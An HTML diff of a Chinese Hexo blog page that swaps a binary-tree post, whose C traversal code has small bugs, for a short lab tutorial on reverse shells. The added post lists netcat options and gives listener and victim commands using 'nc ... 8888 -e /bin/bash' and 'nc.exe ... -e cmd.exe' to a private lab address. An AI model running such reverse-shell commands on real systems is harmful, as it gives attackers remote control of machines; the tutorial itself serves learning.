@@ -81,20 +81,20 @@
 
 
 
-<meta name="description" content="树的定义：树是n（n&amp;gt;=0）个节点的有限集合。当n==0时，称为空树，当n&amp;gt;=0时，树满足以下条件：    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集">
+<meta name="description" content="前言：&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。 第一部分：反向shell介绍&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在">
 <meta property="og:type" content="article">
-<meta property="og:title" content="浅谈数据结构之二叉树">
-<meta property="og:url" content="http://yoursite.com/2017/11/05/浅谈数据结构之二叉树/index.html">
+<meta property="og:title" content="反向shell">
+<meta property="og:url" content="http://yoursite.com/2018/02/02/反向shell技术/index.html">
 <meta property="og:site_name" content="findream&#39;s blog">
-<meta property="og:description" content="树的定义：树是n（n&amp;gt;=0）个节点的有限集合。当n==0时，称为空树，当n&amp;gt;=0时，树满足以下条件：    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集">
+<meta property="og:description" content="前言：&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。 第一部分：反向shell介绍&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/N43CGuq.jpg">
-<meta property="og:image" content="https://i.imgur.com/SjnBCZt.jpg">
-<meta property="og:updated_time" content="2017-11-21T05:35:23.140Z">
+<meta property="og:image" content="https://i.imgur.com/CCfyQLJ.png">
+<meta property="og:image" content="https://i.imgur.com/At9qTb9.png">
+<meta property="og:updated_time" content="2018-02-02T09:00:58.721Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="浅谈数据结构之二叉树">
-<meta name="twitter:description" content="树的定义：树是n（n&amp;gt;=0）个节点的有限集合。当n==0时，称为空树，当n&amp;gt;=0时，树满足以下条件：    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集">
-<meta name="twitter:image" content="https://i.imgur.com/N43CGuq.jpg">
+<meta name="twitter:title" content="反向shell">
+<meta name="twitter:description" content="前言：&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。 第一部分：反向shell介绍&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在">
+<meta name="twitter:image" content="https://i.imgur.com/CCfyQLJ.png">
 
 
 
@@ -124,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/11/05/浅谈数据结构之二叉树/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/02/02/反向shell技术/"/>
 
 
 
 
 
-  <title>浅谈数据结构之二叉树 | findream's blog</title>
+  <title>反向shell | findream's blog</title>
   
 
 
@@ -297,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/05/浅谈数据结构之二叉树/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/02/02/反向shell技术/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="findream">
@@ -314,7 +314,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">浅谈数据结构之二叉树</h1>
+          <h1 class="post-title" itemprop="name headline">反向shell</h1>
         
 
         <div class="post-meta">
@@ -326,8 +326,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-05T18:45:11+08:00">
-                2017-11-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-02T16:45:11+08:00">
+                2018-02-02
               </time>
             
 
@@ -336,6 +336,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -364,124 +386,16 @@
       
 
       
-        <h1 id="树的定义："><a href="#树的定义：" class="headerlink" title="树的定义："></a>树的定义：</h1><p>树是n（n&gt;=0）个节点的有限集合。当n==0时，称为空树，当n&gt;=0时，树满足以下条件：<br>    <strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。</strong><br>    <strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集合称之为树，即根的子树</strong><br><a id="more"></a></p>
-<h1 id="二叉树的定义："><a href="#二叉树的定义：" class="headerlink" title="二叉树的定义："></a>二叉树的定义：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在计算机科学中，二叉树是每个节点最多有两个子树的树结构。通常子树被称作“左子树”（left subtree）和“右子树”（right subtree）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>二叉树的第i层至多有2^{i-1}个结点；深度为k的二叉树至多有2^k-1个结点；对任何一棵二叉树T，如果其终端结点数为n_0，度为2的结点数为n_2，则n_0=n_2+1。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>一棵深度为k，且有2^k-1个节点称之为满二叉树；深度为k，有n个节点的二叉树，当且仅当其每一个节点都与深度为k的满二叉树中，序号为1至n的节点对应时，称之为完全二叉树。</strong></p>
-<h1 id="二叉树的存储结构："><a href="#二叉树的存储结构：" class="headerlink" title="二叉树的存储结构："></a>二叉树的存储结构：</h1><p><strong>1.顺序存储结构：</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于满二叉树和完全二叉树来说，按照满二叉树节点连续编号的次序，将各节点数据存放在一组连续的内存单元，即用一维数组作为存储结构。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;满足一下条件：<br><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1)左子树是双亲节点次序的2n倍</strong><br><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2)右子树是双亲节点次序的2n+1倍</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图所示，将二叉树按顺序结构存储：<br>     <img src="https://i.imgur.com/N43CGuq.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将这个二叉树按顺序结构存储：<br>     <img src="https://i.imgur.com/SjnBCZt.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的顺序存储模型的DAT描述如下：</p>
-<pre><code>
-     typedef char datatype 
-     typedef struct 
-     {
-         datatype SqBiTree[MAXSIZE+1];
-         int nodemax;
-     }BiTree;
-</code></pre>
-**2.链式存储结构：**
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的链式存储结构是指用链表来表示一棵二叉树，即用链来指示元素的逻辑关系。
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的每个结点最多有两个孩子，因此，每个结点除了存储自身的数据外，还应设置两个指针分别指向左、右孩子结点。
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图所示，将二叉树链式结构存储：
-    ![](https://i.imgur.com/EnR6Mhx.png)  
-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的链式存储模式的DAT描述：
-<pre><code>
-     typedef char datatype
-     typedef struct node
-     {
-          datatype data;
-          struct node *Lchild; 
-          struct node *Rchild;
-    }
-</code></pre> 
-# 二叉树的建立：
-<pre><code>
-    void CreateBiTree(BiTree &root)     //创建二叉树
-    {                                   //这里加上&意思是传递的参数为指针的引用，括号里面等价于 BiTreeNode* &T
-        char ch;
-        ch = getchar();
-        if ('#' == ch)
-            root = NULL;
-        else
-        {
-            root = (BiTree)malloc(sizeof(BiTree));
-            root->data = ch;
-            CreateBiTree(root->Lchild);
-            CreateBiTree(root->Rchild);
-        }
-    }
-</code></pre>
-# 二叉树的遍历：
-<pre><code> 1）先序递归遍历：
-     void PreOrder(BiTree root)
-     {
-       if (root)
-       {
-          visit(root->data);
-          PreOrder(root->Lchild);
-          PreOrder(root->Rchild);
-       }
-     }
-</code></pre>
-<pre><code> 2)中序递归遍历：
-    void InOrder(BiTree root)
-    {
-        if(root)
-        {    
-            InOrder(root->LChild);
-            visit(root->data);
-            InOrder(root->RChild);
-        }
-    }
-</code></pre>
-<pre><code> 2)后序递归遍历：
-    void PostOrder(BiTree root)
-    {
-        if(root)
-        {
-            PostOrder(root->Lchild);
-            PostOrder(root->RChild);
-            visit(root->data);
-        }
-    }
-
-</code></pre>
-<pre><code> 2)先序非递归遍历：
-    void PreOrder(BiTree root)]
-    {
-        SeqStack *s;
-        InitStack(s);
-        BiTree p=root;
-        while(p!=NULL||s!=NULL)
-        {
-            while(p!=NULL)
-            {
-                visit(p->data);
-                Push(s,p);          //保存上一步节点信息，以便下次返回使用
-                p=p->LChild;
-            }
-            if(IsEmpty(s))
-            {
-                Pop(s,&p);
-                p=p->RChild;      //进入右子树，开始下一次循环
-            }    
-        }
-    }
-</code></pre>
-<pre><code>二叉树的层次遍历
-    void LevelOrder(BiTree root)
-    {
-        SeqQueue *q;
-        BiTree p;
-        InitQueue(q);
-        EnterQueue(q,root);        //人队列
-        while(!IsEmpty(q))
-        {
-            DeleteQueue(q,&p);   //出队列
-            visit(p);
-            if(p->Lchild)
-                EnterQueue(q,p);
-            if(p->Rchild)
-                EnterQueue(q,p);
-        }
-    }
-</code></pre>
+        <p>前言：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>这几天一直在看恶意代码查杀实战，看到第十一章了，主要讲的是几种恶意代码感染主机的方法和避免查杀的方法，首先介绍的是反向shell。</strong></p>
+<h1 id="第一部分：反向shell介绍"><a href="#第一部分：反向shell介绍" class="headerlink" title="第一部分：反向shell介绍"></a>第一部分：反向shell介绍</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们先看一下所谓的正向shell，现在我们主要采用C/S模型作为我们网络交互的主要模型，在这个模型中，一般的都是服务器对客户机发送请求。这个可以理解为正向的连接（正向shell），那么所谓的反向shell呢？反向shell是从被感染的机器中发起一个连接，他提供攻击者访问被感染机器的权限。现在主要流行两种反向shell的方法。第一种是<strong>netcat反向shell，</strong>还有一种是<strong>windows反向shell</strong>。</p>
+<h1 id="第二部分：工具使用"><a href="#第二部分：工具使用" class="headerlink" title="第二部分：工具使用"></a>第二部分：工具使用</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用netcat反向shell需要使用的工具是netcat。在网络工具中有“瑞士军刀”美誉。<br><figure class="highlight plain"><figcaption><span>-p -e这三个参数</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">-C</div><div class="line">类似-L选项，一直不断连接[1.13版本新加的功能]</div><div class="line">-d</div><div class="line">后台执行</div><div class="line">-e prog</div><div class="line">程序重定向，一旦连接，就执行 [危险！！]</div><div class="line">-g gateway</div><div class="line">源路由跳数,最大值为8(source-routing hop point[s],up to 8)</div><div class="line">-G num</div><div class="line">源路由指针:4,8,12,... (source-routing pointer: 4,8,12,...)</div><div class="line">-h</div><div class="line">帮助信息</div><div class="line">-i secs</div><div class="line">延时的间隔</div><div class="line">-l</div><div class="line">监听模式，用于入站连接</div><div class="line">-n</div><div class="line">指定数字的IP地址，不能用hostname</div><div class="line">-o file</div><div class="line">记录16进制的传输</div><div class="line">-p port</div><div class="line">本地端口号</div><div class="line">-r</div><div class="line">任意指定本地及远程端口</div><div class="line">-s addr</div><div class="line">本地源地址</div><div class="line">-u</div><div class="line">UDP模式,[netcat-1.15可以:远程nc -ulp port -e cmd.exe，本地nc -u ip port连接，得到一个shell.]</div><div class="line">-v</div><div class="line">详细输出——用两个-v可得到更详细的内容</div><div class="line">-w secs</div><div class="line">指定超时的时间</div><div class="line">-z</div><div class="line">将输入输出关掉——用于扫描时</div></pre></td></tr></table></figure></p>
+<h1 id="第三部分：利用netcat创建反向shell"><a href="#第三部分：利用netcat创建反向shell" class="headerlink" title="第三部分：利用netcat创建反向shell"></a>第三部分：利用netcat创建反向shell</h1><p>0.前提：利用虚拟机，攻击者是linux虚拟机，被攻击者是windows xp，linux的网络地址配置如下（等下要用），并将两台虚拟机都设置成主机模式。<br>     <img src="https://i.imgur.com/CCfyQLJ.png" alt=""></p>
+<p>1.首先，我们在攻击者机器中设置一个监听，主要监听的是8888端口，我们监听的端口主要选择一些没有被使用过的端口，一般的1000多的端口都没有被使用。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc lvp <span class="number">8888</span></div></pre></td></tr></table></figure></p>
+<p>2.在被攻击者机器中发送链接请求：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于Linux机器来说，使用一下命令：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc <span class="number">192.168</span><span class="number">.221</span><span class="number">.129</span> <span class="number">8888</span> -e / bin / bash</div></pre></td></tr></table></figure></p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于windows机器来说，使用以下命令：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">nc</span><span class="selector-class">.exe</span> 192<span class="selector-class">.168</span><span class="selector-class">.221</span><span class="selector-class">.129</span> 8888 <span class="selector-tag">-e</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span></div></pre></td></tr></table></figure></p>
+<pre><code>![](https://i.imgur.com/CsRYflh.png)
+</code></pre><p>3.至此，我们在攻击者机器中就获得了与被攻击者同等权限的shell了，那么我们打开对我们被攻击者做出一些操作。就是反应有点慢。<br>    <img src="https://i.imgur.com/At9qTb9.png" alt=""></p>
+<p>4.这个只是了解反向shell的基本原理，在实践中很难被利用。</p>
 
       
     </div>
@@ -506,8 +420,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/11/02/六种常见语言的逆向思路/" rel="next" title="六类语言的逆向思路">
-                <i class="fa fa-chevron-left"></i> 六类语言的逆向思路
+              <a href="/2018/01/29/重新配置hexo博客/" rel="next" title="重新配置hexo博客">
+                <i class="fa fa-chevron-left"></i> 重新配置hexo博客
               </a>
             
           </div>
@@ -515,10 +429,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/11/06/switch结构逆向分析/" rel="prev" title="switch结构逆向分析">
-                switch结构逆向分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -650,7 +560,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#树的定义："><span class="nav-number">1.</span> <span class="nav-text">树的定义：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二叉树的定义："><span class="nav-number">2.</span> <span class="nav-text">二叉树的定义：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二叉树的存储结构："><span class="nav-number">3.</span> <span class="nav-text">二叉树的存储结构：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一部分：反向shell介绍"><span class="nav-number">1.</span> <span class="nav-text">第一部分：反向shell介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二部分：工具使用"><span class="nav-number">2.</span> <span class="nav-text">第二部分：工具使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三部分：利用netcat创建反向shell"><span class="nav-number">3.</span> <span class="nav-text">第三部分：利用netcat创建反向shell</span></a></li></ol></div>
             
 
           </div>
